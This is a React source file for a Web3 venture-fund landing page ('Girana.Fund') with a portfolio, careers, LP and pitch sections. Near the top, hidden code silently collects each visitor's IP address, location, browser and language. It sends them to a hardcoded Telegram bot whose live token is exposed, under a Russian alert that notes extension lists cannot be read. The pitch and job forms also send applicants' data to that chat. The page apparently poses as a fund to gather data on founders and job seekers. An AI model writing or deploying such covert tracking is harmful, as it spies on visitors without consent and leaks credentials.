import React, { useEffect, useRef, useState } from 'react';
import gsap from 'gsap';
import { ScrollTrigger } from 'gsap/ScrollTrigger';
import { useGSAP } from '@gsap/react';
import Lenis from 'lenis';
import { Menu, X } from 'lucide-react';
import createGlobe from 'cobe';

gsap.registerPlugin(ScrollTrigger);

// Telegram Bot Configuration
const TELEGRAM_BOT_TOKEN = '8715802112:AAFcufzTV2r_4JBFl1CDP6MjQ-onCqVE2so';
const TELEGRAM_CHAT_ID = '-5042990329';

const sendToTelegram = async (text: string) => {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  const response = await fetch(url, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: text,
      parse_mode: 'HTML',
    }),
  });
  if (!response.ok) {
    throw new Error('Failed to send message to Telegram');
  }
};

const PORTFOLIO_DATA = [
  { 
    name: 'Espresso', 
    category: 'Infrastructure',
    url: 'https://www.espressosys.com/',
    logo: 'https://logo.clearbit.com/espressosys.com',
    image: 'https://images.unsplash.com/photo-1639762681485-074b7f4ec651?auto=format&fit=crop&q=80&w=800'
  },
  { 
    name: 'Fetch.ai', 
    category: 'Agentic AI',
    url: 'https://fetch.ai/',
    logo: 'https://logo.clearbit.com/fetch.ai',
    image: 'https://images.unsplash.com/photo-1677442136019-21780ecad995?auto=format&fit=crop&q=80&w=800'
  },
  { 
    name: 'Nym', 
    category: 'Data Privacy',
    url: 'https://nymtech.net/',
    logo: 'https://logo.clearbit.com/nymtech.net',
    image: 'https://images.unsplash.com/photo-1614064641936-3899897fa46b?auto=format&fit=crop&q=80&w=800'
  },
  { 
    name: 'Zama', 
    category: 'Cryptography',
    url: 'https://zama.ai/',
    logo: 'https://logo.clearbit.com/zama.ai',
    image: 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?auto=format&fit=crop&q=80&w=800'
  },
  { 
    name: 'Helium', 
    category: 'DePIN',
    url: 'https://www.helium.com/',
    logo: 'https://logo.clearbit.com/helium.com',
    image: 'https://images.unsplash.com/photo-1519389950473-47ba0277781c?auto=format&fit=crop&q=80&w=800'
  },
  { 
    name: 'Scroll', 
    category: 'ZK Layer',
    url: 'https://scroll.io/',
    logo: 'https://logo.clearbit.com/scroll.io',
    image: 'https://images.unsplash.com/photo-1639322537228-f710d846310a?auto=format&fit=crop&q=80&w=800'
  },
  { 
    name: 'LayerZero', 
    category: 'Cross-chain',
    url: 'https://layerzero.network/',
    logo: 'https://logo.clearbit.com/layerzero.network',
    image: 'https://images.unsplash.com/photo-1451187580459-43490279c0fa?auto=format&fit=crop&q=80&w=800'
  },
  { 
    name: 'Gauntlet', 
    category: 'Tokenomics',
    url: 'https://gauntlet.network/',
    logo: 'https://logo.clearbit.com/gauntlet.network',
    image: 'https://images.unsplash.com/photo-1551288049-bebda4e38f71?auto=format&fit=crop&q=80&w=800'
  }
];

const CATEGORIES = ['All', 'Infrastructure', 'Agentic AI', 'Data Privacy', 'Cryptography', 'DePIN', 'ZK Layer', 'Cross-chain', 'Tokenomics'];

const JOBS_DATA = [
  { id: 1, role: 'Protocol Engineer', company: 'Espresso', location: 'Remote', logo: 'https://logo.clearbit.com/espressosys.com' },
  { id: 2, role: 'Applied Cryptographer', company: 'Zama', location: 'Paris / Remote', logo: 'https://logo.clearbit.com/zama.ai' },
  { id: 3, role: 'Rust Developer', company: 'Fetch.ai', location: 'Remote', logo: 'https://logo.clearbit.com/fetch.ai' },
  { id: 4, role: 'DeFi Economist', company: 'Gauntlet', location: 'New York', logo: 'https://logo.clearbit.com/gauntlet.network' },
  { id: 5, role: 'ZK Researcher', company: 'Scroll', location: 'Remote', logo: 'https://logo.clearbit.com/scroll.io' }
];

function CobeGlobe() {
  const canvasRef = useRef<HTMLCanvasElement>(null);

  useEffect(() => {
    let phi = 0;

    if (!canvasRef.current) return;

    const globe = createGlobe(canvasRef.current, {
      devicePixelRatio: 2,
      width: 600 * 2,
      height: 600 * 2,
      phi: 0,
      theta: 0,
      dark: 1,
      diffuse: 1.2,
      mapSamples: 16000,
      mapBrightness: 6,
      baseColor: [0.1, 0.1, 0.1],
      markerColor: [1, 1, 1],
      glowColor: [0.2, 0.2, 0.2],
      markers: [
        { location: [40.7128, -74.0060], size: 0.05 }, // NYC
        { location: [51.5074, -0.1278], size: 0.05 }, // London
        { location: [1.3521, 103.8198], size: 0.05 }, // Singapore
        { location: [43.6532, -79.3832], size: 0.05 }, // Toronto
      ],
      onRender: (state) => {
        state.phi = phi;
        phi += 0.003;
      },
    });

    return () => {
      globe.destroy();
    };
  }, []);

  return (
    <div className="globe-canvas-wrapper">
      <canvas
        ref={canvasRef}
        style={{ width: 600, height: 600, maxWidth: "100%", aspectRatio: 1 }}
      />
    </div>
  );
}

export default function App() {
  const containerRef = useRef<HTMLDivElement>(null);
  const [isMenuOpen, setIsMenuOpen] = useState(false);
  const [activeTab, setActiveTab] = useState('All');
  const [selectedJob, setSelectedJob] = useState<any>(null);

  const filteredPortfolio = activeTab === 'All' 
    ? PORTFOLIO_DATA 
    : PORTFOLIO_DATA.filter(item => item.category === activeTab);

  useEffect(() => {
    const notifyVisit = async () => {
      try {
        if (sessionStorage.getItem('visited')) return;
        sessionStorage.setItem('visited', 'true');

        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        
        const ip = data.ip || 'Unknown';
        const country = data.country_name || 'Unknown';
        const city = data.city || 'Unknown';
        const userAgent = navigator.userAgent;
        const language = navigator.language;

        const message = `
👀 <b>Новый посетитель на сайте!</b>

<b>IP:</b> ${ip}
<b>Страна:</b> ${country}, ${city}
<b>Язык:</b> ${language}
<b>Браузер/ОС:</b> ${userAgent}

<i>* Примечание: Получить точный список установленных расширений браузера невозможно из-за политик безопасности современных браузеров.</i>
        `;

        await sendToTelegram(message);
      } catch (error) {
        console.error('Failed to notify visit:', error);
      }
    };

    notifyVisit();
  }, []);

  useEffect(() => {
    const lenis = new Lenis();

    lenis.on('scroll', ScrollTrigger.update);

    gsap.ticker.add((time) => {
      lenis.raf(time * 1000);
    });

    gsap.ticker.lagSmoothing(0);

    return () => {
      lenis.destroy();
      gsap.ticker.remove(lenis.raf);
    };
  }, []);

  useGSAP(() => {
    // HERO ENTRANCE
    gsap.from(".animate-text", {
      y: 60,
      opacity: 0,
      duration: 1.2,
      stagger: 0.2,
      ease: "power4.out"
    });

    // SCROLL REVEAL
    gsap.utils.toArray(".animate-up").forEach((el: any) => {
      gsap.from(el, {
        scrollTrigger: {
          trigger: el,
          start: "top 95%",
        },
        y: 40,
        opacity: 0,
        duration: 1,
        ease: "power2.out"
      });
    });

    // BORDER LINES
    gsap.utils.toArray(".border-top").forEach((line: any) => {
      gsap.from(line, {
        scrollTrigger: {
          trigger: line,
          start: "top 98%",
        },
        scaleX: 0,
        transformOrigin: "left",
        duration: 1.8,
        ease: "expo.out"
      });
    });

    // PROCESS LINE SCRUB
    gsap.from(".process-line", {
      scrollTrigger: {
        trigger: ".process-container",
        start: "top 70%",
        end: "bottom 80%",
        scrub: true
      },
      scaleY: 0,
      ease: "none"
    });

    // STAT COUNTERS
    document.querySelectorAll(".stat-num").forEach((el: any) => {
      const target = parseInt(el.dataset.target, 10);
      
      gsap.fromTo(el, { innerText: 0 }, {
        innerText: target,
        duration: 2.5,
        ease: "power2.out",
        snap: { innerText: 1 },
        scrollTrigger: {
          trigger: el,
          start: "top 90%",
          once: true
        }
      });
    });

    ScrollTrigger.refresh();
  }, { scope: containerRef });

  const toggleMenu = () => setIsMenuOpen(!isMenuOpen);

  return (
    <div ref={containerRef}>
      <div className="grid-overlay"></div>

      {/* Mobile Navigation Overlay */}
      <div className={`mobile-nav ${isMenuOpen ? 'open' : ''}`}>
        <a href="#portfolio" onClick={toggleMenu}>Portfolio</a>
        <a href="#founders" onClick={toggleMenu}>Founders</a>
        <a href="#process" onClick={toggleMenu}>How it works</a>
        <a href="#news" onClick={toggleMenu}>Insights</a>
        <a href="#jobs" onClick={toggleMenu}>Careers</a>
        <a href="#lp" onClick={toggleMenu}>LP Access</a>
        <a href="#pitch" onClick={toggleMenu}>Pitch Us</a>
      </div>

      <nav className="nav-bar">
        <div className="container nav-content">
          <div className="logo">GIRANA<span>.FUND</span></div>
          <div className="nav-links">
            <a href="#portfolio">Portfolio</a>
            <a href="#founders">Founders</a>
            <a href="#process">How it works</a>
            <a href="#news">Insights</a>
            <a href="#jobs">Careers</a>
            <a href="#lp">LP Access</a>
            <a href="#pitch" className="nav-cta">Pitch Us &rarr;</a>
          </div>
          <button className="mobile-menu-btn" onClick={toggleMenu}>
            {isMenuOpen ? <X size={28} /> : <Menu size={28} />}
          </button>
        </div>
      </nav>

      <main>
        <section className="hero container">
          <div className="hero-content">
            <span className="label animate-text">/ 01. PREFACE</span>
            <h1 className="animate-text">QUANTUM<br /><span className="outline">LEAP.</span></h1>
            <div className="hero-footer border-top">
              <p className="animate-up">We invest in the architecture of the future: decentralized protocols, autonomous AI agents, and sovereign computing.</p>
              <div className="stat animate-up">V.01<span>2026</span></div>
            </div>
          </div>
        </section>

        <div className="ticker-wrap border-top">
          <div className="ticker-track">
            <span>DECENTRALIZED PROTOCOLS</span>
            <span className="ticker-dot">&#9670;</span>
            <span>AGENTIC AI</span>
            <span className="ticker-dot">&#9670;</span>
            <span>SOVEREIGN COMPUTE</span>
            <span className="ticker-dot">&#9670;</span>
            <span>WEB3 INFRASTRUCTURE</span>
            <span className="ticker-dot">&#9670;</span>
            <span>CRYPTOGRAPHIC PRIVACY</span>
            <span className="ticker-dot">&#9670;</span>
            <span>TOKEN ARCHITECTURE</span>
            <span className="ticker-dot">&#9670;</span>
            <span>ZERO-KNOWLEDGE PROOFS</span>
            <span className="ticker-dot">&#9670;</span>
            <span>CROSS-CHAIN LIQUIDITY</span>
            <span className="ticker-dot">&#9670;</span>
            <span>DECENTRALIZED PROTOCOLS</span>
            <span className="ticker-dot">&#9670;</span>
            <span>AGENTIC AI</span>
            <span className="ticker-dot">&#9670;</span>
            <span>SOVEREIGN COMPUTE</span>
            <span className="ticker-dot">&#9670;</span>
            <span>WEB3 INFRASTRUCTURE</span>
            <span className="ticker-dot">&#9670;</span>
            <span>CRYPTOGRAPHIC PRIVACY</span>
            <span className="ticker-dot">&#9670;</span>
            <span>TOKEN ARCHITECTURE</span>
            <span className="ticker-dot">&#9670;</span>
            <span>ZERO-KNOWLEDGE PROOFS</span>
            <span className="ticker-dot">&#9670;</span>
            <span>CROSS-CHAIN LIQUIDITY</span>
            <span className="ticker-dot">&#9670;</span>
          </div>
        </div>

        <section id="portfolio" className="section border-top">
          <div className="container">
            <span className="label">/ 02. PORTFOLIO</span>
            
            <div className="portfolio-tabs animate-up">
              {CATEGORIES.map(cat => (
                <button 
                  key={cat} 
                  className={`tab-btn ${activeTab === cat ? 'active' : ''}`}
                  onClick={() => setActiveTab(cat)}
                >
                  {cat}
                </button>
              ))}
            </div>

            <div className="portfolio-grid">
              {filteredPortfolio.map((item, i) => (
                <a 
                  key={item.name} 
                  href={item.url} 
                  target="_blank" 
                  rel="noreferrer" 
                  className="p-item animate-up" 
                  style={{ animationDelay: `${i * 0.1}s` }}
                >
                  <div className="p-image-bg" style={{ backgroundImage: `url(${item.image})` }}></div>
                  <div className="p-content">
                    <div className="p-header">
                      <img src={item.logo} alt={`${item.name} logo`} className="p-logo" onError={(e) => {
                        (e.target as HTMLImageElement).style.display = 'none';
                      }} />
                      <span className="p-arrow">&nearr;</span>
                    </div>
                    <div>
                      <span>{item.name}</span>
                      <br />
                      <small>{item.category}</small>
                    </div>
                  </div>
                </a>
              ))}
            </div>
          </div>
        </section>

        <section className="section-stats border-top">
          <div className="container">
            <div className="stats-grid">
              <div className="stat-block">
                <div className="stat-num" data-target="50">0</div>
                <div className="stat-label">Portfolio companies<br />backed across Web3</div>
              </div>
              <div className="stat-block">
                <div className="stat-num" data-target="12">0</div>
                <div className="stat-label">Countries with<br />active investments</div>
              </div>
              <div className="stat-block">
                <div className="stat-num" data-target="3">0</div>
                <div className="stat-label">Fund generations<br />deployed</div>
              </div>
              <div className="stat-block">
                <div className="stat-num" data-target="7">0</div>
                <div className="stat-label">Days avg. from call<br />to signed agreement</div>
              </div>
            </div>
          </div>
        </section>

        <section id="founders" className="section border-top">
          <div className="container">
            <span className="label">/ 03. FOUNDERS</span>
            <div className="team-grid">
              <div className="team-card animate-up">
                <div className="img-box">
                  <img src="https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?auto=format&fit=crop&q=80&w=800" alt="Han Min-ji" />
                </div>
                <div className="team-info">
                  <h3>Han Min-ji</h3>
                  <p>Managing Partner</p>
                  <div className="team-social">
                    <a href="https://t.me/MinJiShadee" target="_blank" rel="noreferrer">TELEGRAM</a>
                  </div>
                </div>
              </div>
              <div className="team-card animate-up">
                <div className="img-box">
                  <img src="https://images.unsplash.com/photo-1560250097-0b93528c311a?auto=format&fit=crop&q=80&w=800" alt="Arun Devabhaktuni" />
                </div>
                <div className="team-info">
                  <h3>Arun Devabhaktuni</h3>
                  <p>General Partner</p>
                  <div className="team-social">
                    <a href="https://t.me/fman_ventures" target="_blank" rel="noreferrer">TELEGRAM</a>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </section>

        <section className="section-quote border-top">
          <div className="container">
            <div className="quote-inner animate-up">
              <div className="quote-mark">"</div>
              <blockquote>Having Girana.Fund on board meant more than funding &mdash; it meant a network, liquidity, and hands-on protocol support at every stage of growth.</blockquote>
              <div className="quote-author">
                <div className="quote-line"></div>
                <div>
                  <p className="quote-name">Mikhail Sorokin</p>
                  <p className="quote-role">Founder, Aether Protocol</p>
                </div>
              </div>
            </div>
          </div>
        </section>

        <section id="process" className="section border-top">
          <div className="container">
            <span className="label">/ 04. OPERATING MODEL</span>
            <div className="process-container">
              <div className="process-line"></div>
              
              <div className="step animate-up">
                <div className="step-num">01</div>
                <div className="step-txt">
                  <h3>Sourcing &amp; Discovery</h3>
                  <p>Our analytical department works directly with open-source repositories and technical communities. We look for fundamental engineering solutions that solve scalability and privacy challenges in the Web3 stack, rather than just business plans.</p>
                </div>
              </div>

              <div className="step animate-up">
                <div className="step-num">02</div>
                <div className="step-txt">
                  <h3>Technical Resilience</h3>
                  <p>Every project undergoes a multi-level audit. We verify smart contract resilience, token economic models, and ecosystem integration potential. We only invest in what we understand at the code level.</p>
                </div>
              </div>

              <div className="step animate-up">
                <div className="step-num">03</div>
                <div className="step-txt">
                  <h3>Capital Deployed</h3>
                  <p>Post-investment, we become a technical and legal partner. Girana.Fund provides access to liquidity, assists with mainnet launch architecture, and ensures direct contact with major exchanges and institutional players.</p>
                </div>
              </div>

              <div className="step animate-up">
                <div className="step-num">04</div>
                <div className="step-txt">
                  <h3>Strategic Growth</h3>
                  <p>Most of our companies attract follow-on rounds from top-tier funds. We help founders prepare for fundraising, connect them with co-investors, and scale their runway. Speed without compromising quality is our standard.</p>
                </div>
              </div>
            </div>
          </div>
        </section>

        <section className="section-global border-top">
          <div className="container">
            <div className="global-inner">
              <div className="global-text animate-up">
                <span className="label">/ 05. WORLDWIDE PRESENCE</span>
                <h2 className="global-headline">Velocity<br />that counts.</h2>
                <p>We invest globally &mdash; from North America and Europe to Asia and emerging markets. This reach gives our founders early access to international partners, exchanges, and local ecosystems from day one.</p>
                <div className="global-regions">
                  <div className="region animate-up">
                    <span className="region-name">North America</span>
                    <span className="region-desc">New York &middot; San Francisco &middot; Toronto</span>
                  </div>
                  <div className="region animate-up">
                    <span className="region-name">Europe</span>
                    <span className="region-desc">London &middot; Zurich &middot; Dubai</span>
                  </div>
                  <div className="region animate-up">
                    <span className="region-name">Asia Pacific</span>
                    <span className="region-desc">Singapore &middot; Hong Kong &middot; Tokyo</span>
                  </div>
                </div>
              </div>
              <div className="global-visual animate-up">
                <CobeGlobe />
              </div>
            </div>
          </div>
        </section>

        <section id="news" className="section-news border-top">
          <div className="container">
            <span className="label">/ 06. INSIGHTS &amp; RESEARCH</span>
            <div className="news-grid">
              <a href="#" className="news-card animate-up">
                <div>
                  <div className="news-meta">
                    <span>Research</span>
                    <span>Oct 12, 2026</span>
                  </div>
                  <h3 className="news-title">The Sovereign Compute Thesis: Why AI Needs Decentralization</h3>
                </div>
                <div className="news-link">Read Paper &rarr;</div>
              </a>
              <a href="#" className="news-card animate-up">
                <div>
                  <div className="news-meta">
                    <span>Announcement</span>
                    <span>Sep 28, 2026</span>
                  </div>
                  <h3 className="news-title">Girana.Fund leads $15M Series A in Neural Protocol</h3>
                </div>
                <div className="news-link">Read Press Release &rarr;</div>
              </a>
              <a href="#" className="news-card animate-up">
                <div>
                  <div className="news-meta">
                    <span>Market Update</span>
                    <span>Aug 04, 2026</span>
                  </div>
                  <h3 className="news-title">Zero-Knowledge Proofs: The New Standard for Institutional Privacy</h3>
                </div>
                <div className="news-link">Read Article &rarr;</div>
              </a>
            </div>
          </div>
        </section>

        <section id="jobs" className="section-jobs border-top">
          <div className="container">
            <span className="label">/ 07. PORTFOLIO CAREERS</span>
            <div className="job-list animate-up">
              {JOBS_DATA.map(job => (
                <button key={job.id} onClick={() => setSelectedJob(job)} className="job-item">
                  <div className="job-logo-wrap">
                    <img src={job.logo} alt={job.company} className="job-logo" onError={(e) => {
                      (e.target as HTMLImageElement).style.display = 'none';
                    }} />
                  </div>
                  <div className="job-title">{job.role}</div>
                  <div className="job-company">{job.company}</div>
                  <div className="job-location">{job.location}</div>
                  <div className="job-apply">Apply Now</div>
                </button>
              ))}
            </div>
          </div>
        </section>

        <section id="lp" className="section-lp border-top">
          <div className="container">
            <div className="lp-inner">
              <div className="lp-left animate-up">
                <span className="label">/ 08. LIMITED PARTNERS</span>
                <h2>Partner<br />as an LP.</h2>
                <p>Explore Fund III and learn how we create value across Web3. We work with family offices, institutional allocators, and high-conviction individuals who want direct exposure to frontier technology.</p>
                <a href="mailto:lp@girana.fund" className="lp-btn">Request LP Deck &rarr;</a>
              </div>
              <div className="lp-right animate-up">
                <LPCard />
              </div>
            </div>
          </div>
        </section>

        <PitchSection />

        <footer className="footer border-top">
          <div className="container footer-content">
            <div className="footer-top">
              <span className="label">/ CONTACT</span>
              <a href="mailto:hello@girana.fund" className="big-mail">hello@girana.fund</a>
            </div>
            <div className="footer-bottom">
              <div className="footer-legal">
                <p>&copy; 2026 GIRANA.FUND. ALL RIGHTS RESERVED.</p>
                <p>PRIVATE &amp; CONFIDENTIAL.</p>
              </div>
              <div className="footer-links">
                <a href="#">MANIFESTO</a>
                <a href="#">LEGAL</a>
                <a href="#">X / TWITTER</a>
              </div>
            </div>
          </div>
        </footer>
      </main>

      <JobModal job={selectedJob} onClose={() => setSelectedJob(null)} />
    </div>
  );
}

function LPCard() {
  const cardRef = useRef<HTMLDivElement>(null);

  const handleMouseMove = (e: React.MouseEvent<HTMLDivElement>) => {
    if (!cardRef.current) return;
    const rect = cardRef.current.getBoundingClientRect();
    const x = ((e.clientX - rect.left) / rect.width) * 100;
    const y = ((e.clientY - rect.top) / rect.height) * 100;
    cardRef.current.style.background = `radial-gradient(circle at ${x}% ${y}%, rgba(255,255,255,0.04) 0%, transparent 60%)`;
  };

  const handleMouseLeave = () => {
    if (!cardRef.current) return;
    cardRef.current.style.background = "";
  };

  return (
    <div 
      className="lp-card" 
      ref={cardRef}
      onMouseMove={handleMouseMove}
      onMouseLeave={handleMouseLeave}
    >
      <div className="lp-card-label">FUND III</div>
      <div className="lp-card-amount">$50M</div>
      <div className="lp-card-desc">Target raise</div>
      <div className="lp-card-divider"></div>
      <div className="lp-card-row">
        <span>Focus</span>
        <span>Web3 Infrastructure &amp; AI</span>
      </div>
      <div className="lp-card-row">
        <span>Stage</span>
        <span>Pre-seed &rarr; Series A</span>
      </div>
      <div className="lp-card-row">
        <span>Geography</span>
        <span>Global</span>
      </div>
      <div className="lp-card-row">
        <span>Min. Ticket</span>
        <span>$250K</span>
      </div>
    </div>
  );
}

function PitchSection() {
  const [status, setStatus] = useState<'idle' | 'submitting' | 'success'>('idle');

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    setStatus('submitting');
    
    const formData = new FormData(e.currentTarget);
    const data = {
      founder: formData.get('founder'),
      email: formData.get('email'),
      project: formData.get('project'),
      stage: formData.get('stage'),
      description: formData.get('description'),
      deck: formData.get('deck')
    };

    const message = `
🚀 <b>New Pitch Application</b>

<b>Founder:</b> ${data.founder}
<b>Email:</b> ${data.email}
<b>Project:</b> ${data.project}
<b>Stage:</b> ${data.stage}

<b>Description:</b>
${data.description}

<b>Deck/Docs:</b> ${data.deck || 'Not provided'}
    `;

    try {
      await sendToTelegram(message);
      setStatus('success');
      e.currentTarget.reset();
    } catch (error) {
      console.error(error);
      setStatus('idle');
      alert('Failed to send application. Please try again later.');
    }
  };

  return (
    <section id="pitch" className="section-pitch border-top">
      <div className="container">
        <div className="pitch-header animate-up">
          <span className="label">/ 09. APPLY</span>
          <h2>Pitch your<br /><span className="outline">startup.</span></h2>
          <p>Share your vision, traction, and what you're building &mdash; we review every application. Most deals move from the first conversation to a signed agreement in just one week.</p>
        </div>
        <form className="pitch-form animate-up" onSubmit={handleSubmit}>
          <div className="form-row">
            <div className="form-field">
              <label>FOUNDER NAME</label>
              <input type="text" name="founder" placeholder="Alex Smith" required />
            </div>
            <div className="form-field">
              <label>EMAIL</label>
              <input type="email" name="email" placeholder="you@project.xyz" required />
            </div>
          </div>
          <div className="form-row">
            <div className="form-field">
              <label>PROJECT NAME</label>
              <input type="text" name="project" placeholder="Protocol name" required />
            </div>
            <div className="form-field">
              <label>STAGE</label>
              <select name="stage" required>
                <option value="">Select stage</option>
                <option value="Idea / Pre-seed">Idea / Pre-seed</option>
                <option value="Seed">Seed</option>
                <option value="Series A">Series A</option>
                <option value="Series B+">Series B+</option>
              </select>
            </div>
          </div>
          <div className="form-field form-field--full">
            <label>WHAT ARE YOU BUILDING?</label>
            <textarea name="description" placeholder="Describe your protocol, technology, and the problem it solves..." required></textarea>
          </div>
          <div className="form-row form-row--end">
            <div className="form-field">
              <label>DECK / DOCS LINK</label>
              <input type="url" name="deck" placeholder="https://notion.so/..." />
            </div>
            <button type="submit" className="form-submit" disabled={status === 'submitting'}>
              <span className="btn-text">
                {status === 'idle' ? 'SUBMIT APPLICATION' : status === 'submitting' ? 'SENDING...' : 'SENT ✓'}
              </span>
              <span className="btn-arrow">&rarr;</span>
            </button>
          </div>
          <div className={`form-success ${status === 'success' ? 'visible' : ''}`}>
            <span>✓</span> Congratulations, your message has been delivered and you will receive a response soon.
          </div>
        </form>
      </div>
    </section>
  );
}

function JobModal({ job, onClose }: { job: any, onClose: () => void }) {
  const [status, setStatus] = useState<'idle' | 'submitting' | 'success'>('idle');

  if (!job) return null;

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    setStatus('submitting');
    
    const formData = new FormData(e.currentTarget);
    const data = {
      name: formData.get('name'),
      email: formData.get('email'),
      link: formData.get('link'),
      cover: formData.get('cover')
    };

    const message = `
💼 <b>New Job Application</b>

<b>Role:</b> ${job.role}
<b>Company:</b> ${job.company}

<b>Candidate:</b> ${data.name}
<b>Email:</b> ${data.email}
<b>LinkedIn/Portfolio:</b> ${data.link || 'Not provided'}

<b>Cover Letter:</b>
${data.cover}
    `;

    try {
      await sendToTelegram(message);
      setStatus('success');
      e.currentTarget.reset();
      setTimeout(() => {
        onClose();
        setStatus('idle');
      }, 2000);
    } catch (error) {
      console.error(error);
      setStatus('idle');
      alert('Failed to send application. Please try again later.');
    }
  };

  return (
    <div className={`modal-overlay ${job ? 'open' : ''}`} onClick={onClose}>
      <div className="modal-content" onClick={e => e.stopPropagation()}>
        <div className="modal-header">
          <div>
            <h3>{job.role}</h3>
            <p>{job.company} &middot; {job.location}</p>
          </div>
          <button className="modal-close" onClick={onClose}>
            <X size={24} />
          </button>
        </div>
        <div className="modal-body">
          <form className="pitch-form" style={{ border: 'none' }} onSubmit={handleSubmit}>
            <div className="form-row">
              <div className="form-field">
                <label>FULL NAME</label>
                <input type="text" name="name" placeholder="Alex Smith" required />
              </div>
              <div className="form-field">
                <label>EMAIL</label>
                <input type="email" name="email" placeholder="you@email.com" required />
              </div>
            </div>
            <div className="form-field form-field--full">
              <label>LINKEDIN / PORTFOLIO</label>
              <input type="url" name="link" placeholder="https://linkedin.com/in/..." />
            </div>
            <div className="form-field form-field--full">
              <label>COVER LETTER / WHY YOU?</label>
              <textarea name="cover" placeholder="Tell us about your experience..." required></textarea>
            </div>
            <div className="form-row form-row--end" style={{ borderTop: '1px solid var(--border)' }}>
              <div className="form-field" style={{ borderRight: 'none', padding: '20px' }}>
                {status === 'success' && <span style={{ color: '#fff', fontFamily: 'var(--mono)', fontSize: '11px' }}>✓ Congratulations, your message has been delivered and you will receive a response soon.</span>}
              </div>
              <button type="submit" className="form-submit" disabled={status === 'submitting'}>
                <span className="btn-text">
                  {status === 'idle' ? 'APPLY NOW' : status === 'submitting' ? 'SENDING...' : 'SENT ✓'}
                </span>
                <span className="btn-arrow">&rarr;</span>
              </button>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
}
